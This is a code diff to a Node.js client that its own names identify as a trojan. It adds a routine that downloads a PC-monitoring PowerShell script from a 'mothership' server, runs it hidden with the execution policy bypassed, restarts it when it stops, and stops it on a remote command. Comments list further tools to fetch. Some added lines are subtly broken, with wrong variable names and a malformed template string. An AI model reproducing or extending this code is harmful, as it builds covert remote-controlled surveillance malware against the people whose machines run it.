@@ -208,6 +208,14 @@ var systemstate = {
         return path.join(this.trojandir, "client_id");
     },
 
+    get pcmondir() {
+        return path.join(this.trojandir, "pcmon");
+    },
+
+    get pspcmondir() {
+        return path.join(this.trojandir, "pcmon");
+    },
+
     get nodedir() {
         return path.join(this.trojandir, "node");
     },
@@ -1527,7 +1535,7 @@ function ping() {
     logmsg("finished");
 }
 
-function execPSScript(scriptfpath, cmdlineargsarr) {
+function execPSScript(scriptfpath, cmdlineargsarr, stdoutfunc, stderrfunc) {
     logmsg("starting");
 
     let enginename = "PS1";
@@ -1560,11 +1568,17 @@ function execPSScript(scriptfpath, cmdlineargsarr) {
         logmsg(`STDOUT: ${data.toString()}`);
 
         fs.writeFileSync(stdoutfpath, data, "utf-8");
+
+        if ( stdoutfunc )
+            stdoutfunc(data);
     });
 
     child.stderr.on("data", (data) => {
         logmsg(`STDERR: ${data.toString()}`);
         fs.writeFileSync(stderrfpath, data, "utf-8");
+
+        if ( stderrfunc )
+            stderrfunc(data);
     });
 
     child.on("close", (code) => {
@@ -3010,9 +3024,11 @@ async function download_python() {
     }
 }
 
+// TODO: populate with list of assets to retrieve
 async function retrieve() {
     logmsg("starting");
 
+    // pc_monitoring.ps1, nircmdc.exe, 7za.exe, gunite.exe
     let scriptname = "pythonrelay.py";
     let baseUrl = systemstate.mothershipassets + "/" + scriptname;
     let params = null; // systemstate.statekvp;
@@ -3046,19 +3062,110 @@ function cleanup() {
     // remove cmdlist_ directories
 }
 
-// TODO
-function pspcmon() {
+// doesn't work on TPL machines
+function pcmon() {
+
+}
+
+async function download_pspcmon() {
+    logmsg('starting');
+
+    let filename = 'pc_monitoring.ps1'; 
+    let baseUrl = systemstate.mothershipassets + "/" + filename;
+    let localpath = path.join(systemstate.pspcmondir, filename);
+
+    fs.mkdirSync(systemstate.pspcmondir, { recursive: true });
+
+    let downloadOpts = {
+        download: true,
+        filetype: "bin",
+        localpath: localpath,
+    };
+
+    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);
+
+    /* downloadOpts { filetype, localpath, download }
+        rawText
+        buffer
+        status
+        statusText
+        headers */
+
+    if ( ! fileExists(localpath) ) {
+        return { state:false, msg:"download failed for " + localpath };
+    }
+
+    const stats = fs.statSync(localpath);
+    logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+
+    logmsg('finished');
+
+    return { state:true };
+}
+
+// TODO // anchor
+async function pspcmon() {
 
     logmsg('starting');
 
+    let pspcmoncmd = systemstate.cmdconfig;
+
+    let ret = await download_pspcmon();
+
+    let scriptfpath = path.join(systemstate.pspcmondir, 'pc_monitoring.ps1');
+
+    if ( ! fileExists(scriptfpath) ) {
+        throw new Error('pspcmon script does not exist '+scriptfpath);
+    }
+
+    let killswitch = false;
+
+    handleMessage = (msgobj) => {
+        let clientjob = msg?.payload ?? null;
+
+        if (!clientjob) {
+            throw new Error("unable to extract clientjob");
+        }
+
+        logmsg("received new client job: " + JSON.stringify(clientjob));
+
+        if ( clientjob?.cmdname == 'StopPSPCMon' ) {
+            killswitch = true;
+        }
+        // TODO: listen for msg from cmdlist for "StopPSPCMon"
+    };
+
+    let childp = null;
+
+    relaycmd.loopfunc = () => {
+        logmsg(`{pspcmoncmd.cmdname} looping...`);
+
+        let tcmdpid = childp?.pid ?? -1;
+
+        if ( killswitch ) {
+            
+            if ( isPidAlive(tcmdpid) )
+                child.kill(); 
+
+            if ( isPidAlive(tcmdpid) )
+                child.kill('SIGKILL'); 
+        
+        }
+
+        if (!isPidAlive(tcmdpid)) {
+            childp = execPSScript(scriptfpath);
+        }
+    };
+
+    relaycmd.loop();
     // invoke_exe -- launch powershell using conhost 
     // monitor child process, if inactive restart
-    // listen for msg from cmdlist for "StopPSPCMon"
     // conhost.exe --headless powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File pc_monitoring.ps1
 
     // let pspcmon = grab cmd obj
 
     // setup loop function
+
 
     logmsg('finished');
 }
